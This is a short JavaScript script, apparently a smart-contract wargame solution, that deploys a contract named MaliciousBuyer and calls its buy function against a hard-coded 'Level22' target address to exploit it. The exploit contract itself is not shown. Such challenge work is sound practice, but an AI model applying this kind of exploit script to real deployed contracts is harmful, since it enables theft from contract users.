const level22 = async (deployer, MaliciousBuyer) => {
    const targetAddress = '0xe8bfb5f0cebf88f7de55b323c98bd59fdbfdb464';
    console.log(`Exploiting Level22 target ${targetAddress}...`);

    console.log('Deploying MaliciousBuyer contract...');
    const buyer = await deployer.deploy(MaliciousBuyer);

    console.log('Buying the item...');
    await buyer.buy(targetAddress);
};

module.exports = level22;